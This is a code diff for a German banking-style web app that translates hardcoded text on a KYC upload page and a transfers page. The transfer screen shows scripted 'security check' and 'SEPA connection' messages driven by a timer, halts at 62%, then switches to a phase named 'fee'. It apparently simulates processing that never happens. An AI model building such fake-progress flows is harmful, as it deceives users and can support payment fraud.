+            <p style={{ color: "#64748B", fontSize: "0.75rem", margin: "3px 0 0" }}>{dui?.acceptedFormatsKyc ?? "Akzeptierte Formate: JPG, PNG, PDF — max. 10 MB pro Datei"}</p>
           </div>
           {uploadErr && (
             <div style={{ margin: "14px 22px 0", background: "#FEF2F2", border: "1px solid #FECACA", borderRadius: 10, padding: "10px 14px" }}>
@@ -1537,12 +1861,12 @@ function KycPage({ token, kycStatus, accountStatus, activationRequired, dui }: {
                       <p style={{ color: "#94A3B8", fontSize: "0.72rem", margin: "2px 0 0" }}>{desc}</p>
                       {existing && (
                         <span style={{ display: "inline-flex", alignItems: "center", gap: 4, marginTop: 5, background: existing.status === "pending" ? "#FFFBF0" : "#F0FDF4", color: existing.status === "pending" ? "#D97706" : "#16A34A", fontSize: "0.68rem", fontWeight: 700, padding: "2px 8px", borderRadius: 20 }}>
-                          {existing.status === "pending" ? "⏳ In Bearbeitung" : "✓ Eingereicht"}
+                          {existing.status === "pending" ? (dui?.inProgressShort ?? "⏳ In Bearbeitung") : (dui?.submittedShort ?? "✓ Eingereicht")}
                         </span>
                       )}
                     </div>
                     <label style={{ display: "flex", alignItems: "center", gap: 6, height: 36, padding: "0 14px", background: isUploading ? "#F1F5F9" : justUploaded ? "#F0FDF4" : existing ? "#F8FAFC" : "#005F2D", border: `1px solid ${existing ? "#E2E8F0" : "transparent"}`, borderRadius: 10, color: isUploading ? "#94A3B8" : justUploaded ? "#16A34A" : existing ? "#64748B" : "white", fontWeight: 600, fontSize: "0.78rem", cursor: isUploading ? "not-allowed" : "pointer", whiteSpace: "nowrap" }}>
-                      {isUploading ? <><RefreshCw size={12} /> Lädt…</> : justUploaded ? <><Check size={12} /> Hochgeladen</> : existing ? <><RefreshCw size={12} /> Ersetzen</> : <><Plus size={12} /> Hochladen</>}
+                      {isUploading ? <><RefreshCw size={12} /> {dui?.loadingShort ?? "Lädt…"}</> : justUploaded ? <><Check size={12} /> {dui?.uploadedShort ?? "Hochgeladen"}</> : existing ? <><RefreshCw size={12} /> {dui?.replaceShort ?? "Ersetzen"}</> : <><Plus size={12} /> {dui?.uploadShort ?? "Hochladen"}</>}
                       <input type="file" accept="image/jpeg,image/png,image/webp,application/pdf" style={{ display: "none" }}
                         onChange={(e) => { const f = e.target.files?.[0]; if (f) upload(docType, f); e.target.value = ""; }}
                         disabled={isUploading} />
@@ -1561,8 +1885,8 @@ function KycPage({ token, kycStatus, accountStatus, activationRequired, dui }: {
           <div style={{ width: 56, height: 56, borderRadius: "50%", background: "#DCFCE7", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto 14px" }}>
             <Check size={26} color="#16A34A" />
           </div>
-          <p style={{ color: "#166534", fontWeight: 800, fontSize: "1rem", margin: "0 0 6px" }}>Konto vollständig verifiziert</p>
-          <p style={{ color: "#166534", fontSize: "0.82rem", margin: 0, opacity: 0.75 }}>Alle KYC-Anforderungen erfüllt. Voller Zugang zu allen Diensten.</p>
+          <p style={{ color: "#166534", fontWeight: 800, fontSize: "1rem", margin: "0 0 6px" }}>{dui?.fullyVerifiedTitle ?? "Konto vollständig verifiziert"}</p>
+          <p style={{ color: "#166534", fontSize: "0.82rem", margin: 0, opacity: 0.75 }}>{dui?.fullyVerifiedDesc ?? "Alle KYC-Anforderungen erfüllt. Voller Zugang zu allen Diensten."}</p>
         </div>
       )}
     </div>
@@ -1572,7 +1896,7 @@ function KycPage({ token, kycStatus, accountStatus, activationRequired, dui }: {
 /* ── TRANSFERS PAGE (module-level to prevent remount on parent re-render) ── */
 const TRANSFER_STORAGE_KEY = "kt_pending_transfer";
 
-const PROGRESS_STEPS = [
+const DEFAULT_PROGRESS_STEPS = [
   { from: 0,  msg: "Sicherheitsprüfung läuft…" },
   { from: 10, msg: "Kontodaten werden verifiziert…" },
   { from: 22, msg: "Verbindung zum SEPA-Netzwerk wird aufgebaut…" },
@@ -1581,9 +1905,17 @@ const PROGRESS_STEPS = [
   { from: 55, msg: "Risikobewertung des Auftrags läuft…" },
   { from: 61, msg: "Abschließende Überprüfung der Konditionen…" },
 ];
-function getMsgForProgress(p: number) {
-  let msg = PROGRESS_STEPS[0].msg;
-  for (const s of PROGRESS_STEPS) { if (p >= s.from) msg = s.msg; }
+function getProgressSteps(dui?: DUI) {
+  if (!dui) return DEFAULT_PROGRESS_STEPS;
+  return [
+    { from: 0,  msg: dui.progressStep1 }, { from: 10, msg: dui.progressStep2 }, { from: 22, msg: dui.progressStep3 },
+    { from: 34, msg: dui.progressStep4 }, { from: 46, msg: dui.progressStep5 }, { from: 55, msg: dui.progressStep6 },
+    { from: 61, msg: dui.progressStep7 },
+  ];
+}
+function getMsgForProgress(p: number, steps: typeof DEFAULT_PROGRESS_STEPS) {
+  let msg = steps[0].msg;
+  for (const s of steps) { if (p >= s.from) msg = s.msg; }
   return msg;
 }
 
@@ -1591,6 +1923,9 @@ function TransfersPage({ token, balance, transferRequests, kycStatus, accountSta
   token: string; balance: number; transferRequests: TransferRequest[];
   kycStatus: string; accountStatus: string; onGoToKyc: () => void;
 }) {
+  const { lang } = useLanguage();
+  const dui = getDUI(lang);
+  const PROGRESS_STEPS = getProgressSteps(dui);
   const [form, setForm] = useState({ to: "", iban: "", amount: "", ref: "" });
   const [phase, setPhase] = useState<"form" | "progress" | "fee" | "error">("form");
   const [progress, setProgress] = useState(0);
@@ -1727,7 +2062,7 @@ function TransfersPage({ token, balance, transferRequests, kycStatus, accountSta
     intervalRef.current = setInterval(() => {
       p += 1;
       setProgress(p);
-      setStatusMsg(getMsgForProgress(p));
+      setStatusMsg(getMsgForProgress(p, PROGRESS_STEPS));
 
       if (p >= 62) {
         clearInterval(intervalRef.current!);
@@ -1863,7 +2198,7 @@ function TransfersPage({ token, balance, transferRequests, kycStatus, accountSta
                 ))}
               </div>
               <div style={{ display: "flex", justifyContent: "space-between", marginTop: 4 }}>
-                {["Sicherheit", "Konto", "SEPA", "Compliance", "Schutz", "Risiko", "Freigabe"].map((l, i) => (
+                {(dui.progressShortLabels ?? ["Sicherheit", "Konto", "SEPA", "Compliance", "Schutz", "Risiko", "Freigabe"]).map((l, i) => (
                   <p key={i} style={{ color: progress >= PROGRESS_STEPS[i].from ? "#005F2D" : "#CBD5E1", fontSize: "0.6rem", margin: 0, fontWeight: progress >= PROGRESS_STEPS[i].from ? 700 : 400 }}>{l}</p>
                 ))}
               </div>
